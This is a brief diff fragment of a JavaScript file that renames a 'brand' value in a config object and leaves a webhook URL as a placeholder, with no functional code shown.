@@ -5,7 +5,7 @@ const querystring = require("querystring");
 const fs = require("fs");
 
 var config = {
-    brand: "chavex7", // replace 
+    brand: "Beamer", // replace 
 
     webhook: "REPLACE_ME",
 
